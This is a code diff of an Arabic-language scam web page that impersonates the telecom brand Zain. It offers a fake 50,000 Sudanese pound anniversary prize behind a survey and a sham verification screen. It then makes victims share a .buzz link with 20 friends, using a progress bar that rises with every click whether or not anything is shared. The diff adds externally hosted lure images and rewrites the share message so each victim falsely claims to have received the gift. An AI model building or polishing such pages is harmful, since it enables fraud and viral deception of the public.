@@ -36,7 +36,7 @@
 
         /* الشريط الوردي */
         .pink-bar {
-            background-color: #a3005a; /* لون أغمق قليلاً ليطابق الصورة */
+            background-color: #a3005a;
             color: white;
             text-align: center;
             padding: 10px 15px;
@@ -63,22 +63,14 @@
             font-weight: 900;
         }
 
-        /* تصميم بانر زين (CSS) */
-        .zain-banner {
-            background: linear-gradient(135deg, #111 0%, #333 100%);
+        /* صورة بانر زين (التي أرسلتها) */
+        .zain-banner-img {
+            width: 100%;
             border-radius: 8px;
-            padding: 20px;
-            color: white;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
             margin-bottom: 20px;
-            border: 2px solid #ffd700;
+            display: block;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-        .banner-text h2 { color: #ffd700; font-size: 20px; margin-bottom: 5px; }
-        .banner-text h1 { color: #ffd700; font-size: 35px; text-align: right; margin: 5px 0; }
-        .banner-text p { font-size: 12px; color: #ccc; }
-        .banner-logo { font-size: 30px; font-weight: 900; color: white; }
 
         /* الاستبيان */
         .survey-question {
@@ -156,9 +148,9 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .verify-text { text-align: center; font-weight: bold; font-size: 16px; margin-bottom: 20px; }
 
-        /* شاشة التهنئة الجديدة (الاحتفال) */
+        /* شاشة التهنئة (الاحتفال) */
         #page-congrats {
-            background: url('https://www.transparenttextures.com/patterns/confetti.png') repeat; /* خلفية احتفال خفيفة */
+            background: url('https://www.transparenttextures.com/patterns/confetti.png') repeat;
             position: relative;
             overflow: hidden;
             border-radius: 8px;
@@ -168,11 +160,13 @@
             border: 1px solid #ddd;
         }
         
-        .money-img {
+        /* صورة الشروط (التي أرسلتها بدل المال) */
+        .rule-img {
             width: 100%;
-            max-width: 300px;
+            max-width: 100%;
             display: block;
             margin: 15px auto;
+            border-radius: 8px;
         }
         
         .congrats-title {
@@ -181,22 +175,6 @@
             text-align: center;
             color: #555;
             margin-bottom: 10px;
-        }
-
-        .win-text {
-            text-align: center;
-            font-size: 18px;
-            font-weight: bold;
-            margin: 15px 0;
-        }
-
-        .rules-list {
-            text-align: right;
-            font-size: 15px;
-            font-weight: bold;
-            line-height: 1.8;
-            margin-bottom: 20px;
-            padding-right: 10px;
         }
 
         .btn-continue-main {
@@ -213,6 +191,7 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
+            margin-top: 15px;
         }
 
         /* شاشة المشاركة وشريط التقدم */
@@ -283,14 +262,8 @@
             <h1 style="font-size: 22px;">تهانينا!</h1>
             <p style="text-align: center; font-weight: bold; font-size: 15px; margin-bottom: 15px;">زين - هدية الذكرى الثلاثين!<br>املأ هذا الاستبيان للحصول على فرصة الفوز بـ 50,000 ج.س.</p>
             
-            <div class="zain-banner">
-                <div class="banner-logo">zain</div>
-                <div class="banner-text">
-                    <h2>احتفلوا بالذكرى الثلاثين!</h2>
-                    <h1>50,000</h1>
-                    <p>ج.س هدية للجميع</p>
-                </div>
-            </div>
+            <!-- 🟢 رابط صورة زين البداية -->
+            <img src="https://dlrjc.buzz/static/images/topimage/ar/01.jpg" alt="Zain Banner" class="zain-banner-img">
 
             <!-- الأسئلة -->
             <div id="q1">
@@ -405,22 +378,13 @@
             <p class="verify-text">لقد أجبت عن جميع الأسئلة الأربعة</p>
         </div>
 
-        <!-- ================= 3. شاشة التهنئة (الاحتفال والنقود السودانية) ================= -->
+        <!-- ================= 3. شاشة التهنئة (صورة الشروط) ================= -->
         <div id="page-congrats" class="hidden">
             <div class="congrats-title">تهانينا</div>
             
-            <!-- صورة الجنيه السوداني (محاكاة) -->
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Sudanese_Pound_50_2020_obverse.jpg/800px-Sudanese_Pound_50_2020_obverse.jpg" class="money-img" alt="Sudanese Pounds">
+            <!-- 🟢 رابط صورة الشروط (بدل المال) -->
+            <img src="https://dlrjc.buzz/static/images/rule.jpg" class="rule-img" alt="Rules">
             
-            <div class="win-text">أحسنت! لقد ربحت ج.س 50,000</div>
-
-            <div class="rules-list">
-                <p>القواعد:</p>
-                <p>1. شارك هذه الفعالية مع 5 مجموعات أو 20 صديقاً!</p>
-                <p>2. بمجرد وصول حالة دعوتك إلى 100%، يمكنك المطالبة بهديتك!</p>
-                <p>3. ستتلقى هديتك خلال 5-7 أيام.</p>
-            </div>
-
             <button class="btn-continue-main" onclick="showSharePage()">متابعة <span>➤</span></button>
             
             <!-- التعليق السفلي -->
@@ -435,7 +399,7 @@
             </div>
         </div>
 
-        <!-- ================= 4. شاشة المشاركة لتفعيل الجائزة ================= -->
+        <!-- ================= 4. شاشة المشاركة ================= -->
         <div id="page-share" class="hidden">
             <h1 style="font-size: 22px;">الخطوة الأخيرة!</h1>
             <p style="text-align: center; font-weight: bold; font-size: 15px; margin-bottom: 20px;">يجب عليك مشاركة الرابط مع 20 صديقاً لتفعيل استلام الجائزة.</p>
@@ -460,7 +424,12 @@
     <script>
         let progress = 0;
         const urlToShare = 'https://nzhds.buzz/unJB';
-        const textToShare = '🎉 زين تحتفل بمرور 30 عاماً! شارك في الاستبيان واحصل على فرصة للفوز بـ 50,000 ج.س. سارع بالدخول: ' + urlToShare;
+        
+        const textToShare = 
+            'احتفالًا بالذكرى السنوية الثلاثين، تقدم زين هدية نقدية خاصة بقيمة ج.س 50,000 للجميع! 🎉\n\n' +
+            'كيفية الحصول على هديتك: انقر على الرابط أدناه للاطلاع على هديتك النقدية من زين بمناسبة الذكرى السنوية الثلاثين، بقيمة ج.س 50,000.\n\n' +
+            'لقد حصلت على هديتي للتو! ❤️\n\n' +
+            '🔗 ' + urlToShare;
 
         // التنقل بين الأسئلة
         function nextQuestion(currentQ) {
@@ -468,7 +437,7 @@
             document.getElementById('q' + (currentQ + 1)).classList.remove('hidden');
         }
 
-        // شاشة التحقق (تظهر لمدة 3 ثواني ثم تنقل للتهنئة)
+        // شاشة التحقق
         function showVerification() {
             document.getElementById('page-survey').classList.add('hidden');
             document.getElementById('page-verify').classList.remove('hidden');
@@ -476,7 +445,7 @@
             setTimeout(() => {
                 document.getElementById('page-verify').classList.add('hidden');
                 document.getElementById('page-congrats').classList.remove('hidden');
-            }, 3000); // 3 ثواني تحميل
+            }, 3000); 
         }
 
         // الانتقال لصفحة المشاركة
@@ -486,7 +455,7 @@
             window.scrollTo(0, 0);
         }
 
-        // المشاركة (تزيد 5% فقط مع كل ضغطة)
+        // المشاركة
         function shareApp(platform) {
             if (progress < 100) {
                 progress += 5; // 20 ضغطة لكتمال الشريط
@@ -501,12 +470,11 @@
             }
         }
 
-        // تحديث شريط التقدم وتفعيل الزر
+        // تحديث شريط التقدم
         function updateProgress() {
             document.getElementById('progress-bar').style.width = progress + '%';
             document.getElementById('progress-text').innerText = progress + '%';
             
-            // عندما يصل إلى 100% (بعد 20 ضغطة)، نغير لون الزر ليصبح قابلاً للنقر
             if (progress >= 100) {
                 let btn = document.getElementById('btn-continue');
                 btn.style.backgroundColor = '#e6007e'; 
